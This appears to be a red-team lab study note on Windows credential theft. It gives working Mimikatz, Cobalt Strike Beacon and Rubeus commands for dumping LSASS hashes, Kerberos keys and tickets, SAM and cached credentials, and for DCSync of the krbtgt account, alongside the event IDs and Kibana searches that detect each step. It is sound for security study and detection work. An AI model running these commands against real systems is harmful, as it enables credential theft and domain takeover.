# Credential Theft

Once elevated on a machine, get creds for other authenticated users. Credentials can come in the form of plaintext (username & password), hashes (NTLM, AES, DCC, NetNTLM, etc), and Kerberos tickets. 

## Beacon + Mimikatz

[Mimikatz](https://github.com/ParrotSec/mimikatz) in Beacon runs in a new temporary process which is then destroyed, so it doesn't work quite the same as native Mimikatz. 

* Can chain commands, e.g. ```mimikatz token::elevate ; lsadump::sam```
* ```!``` elevates Beacon to SYSTEM before running the command, e.g. ```mimikatz !lsadump::sam```
* ```@``` impersonates Beacon's thread token before running the command, e.g. ```mimikatz @lsadump::dcsync /user:DEV\krbtgt```
  * Compatible with other impersonation primitives such as make_token and steal_token

## NTLM Hashes

```mimikatz !sekurlsa::logonpasswords``` can dump plaintext passwords from memory, but these don't exist anymore in Win 10+. Can still extract NTLM hashes and use those in Pass the Hash or cracking.

CS has a command for this: ```logonpasswords```.  After dumping these credentials, go to View > Credentials to see them.

This module opens a read handle to LSASS, logged under event 4656.  Use the "Suspicious Handle to LSASS" saved search in Kibana to see them.

## Kerberos Encryption Keys

Now, Windows services use Kerberos over NTLM, so getting these makes more sense to better blend into normal authentication traffic. 

```mimikatz !sekurlsa::ekeys``` dumps the Kerberos encryption keys of currently logged on users. In CS, these hashes can be added manually via View > Credentials > Add.

This module also opens a read handle to LSASS and is logged.

## Security Account Manager (SAM) database

```mimikatz !lsadump::sam``` reads the SAM to extract NTLM hashes of local accounts only. Handy if a local admin uses the same password across machines. Use with pass the hash.

This module opens a handle to the SAM registry hive. Use the "Suspicious SAM Hive Handle" saved search in Kibana to see
## Domain Cached Credentials (DCC)

```mimikatz !lsadump::cache``` extracts hashes so they can be cracked offline (using e.g. [hashcat](https://hashcat.net/hashcat) -- [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)) to recover plaintext credentials. Very slow.

This module opens a handle to the SECURITY registry hive. Use the "Suspicious SECURITY Hive Handle" saved search in Kibana to see.

## Extracting Kerberos Tickets

[Rubeus](https://github.com/GhostPack/Rubeus) is designed for Kerberos interaction using legitimate Windows APIs. 

```execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage /nowrap``` lists all Kerberos tickets in the current logon session and if elevated, from all logon sessions on the machine. Tickets for the service name krbtgt are Ticket Granting Tickets (TGTs) and others are Ticket Granting Service Tickets (TGSs). 

```execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt``` extracts tickets from memory. Because it uses WinAPIs, it does not open suspicious handles to LSASS. Use ```/luid:``` and ```/service:``` to target specific tickets, e.g. ```execute-assembly .\Rubeus.exe dump /luid:0x7049f /service:krbtgt```

## DCSync

The [Directory Replication Service (MS-DRSR)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47) protocol synchronises and replicates AD data between domain controllers. DCSync leverages MS-DRSR to extract username and credential data from a DC (usually only domain admins can use).

On beacon; extracting NTLM and AES keys for the krbtgt account using nlamb (a domain admin):
```make_token DEV\nlamb F3rrari```

```dcsync dev.cyberbotic.io DEV\krbtgt``` // calls mimikatz lsadump::dcsync in the background

Directory replication can be detected if Directory Service Access auditing is enabled, by searching for 4662 events where the identifying GUID is ```1131f6aa-9c07-11d1-f79f-00c04fc2dcd2``` (for DS-Replication-Get-Changes and DS-Replication-Get-Changes-All) or ```89e95b76-444d-4c62-991a-0facbeda640c``` (DS-Replication-Get-Changes-In-Filtered-Set). Find these using the "Suspicious Directory Replication" saved search in Kibana.

Replication traffic can also be seen via applications such as [Azure AD Connect](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-azure-ad-connect).  Mature orgs should baseline typical DRS traffic to find suspicious outliers.
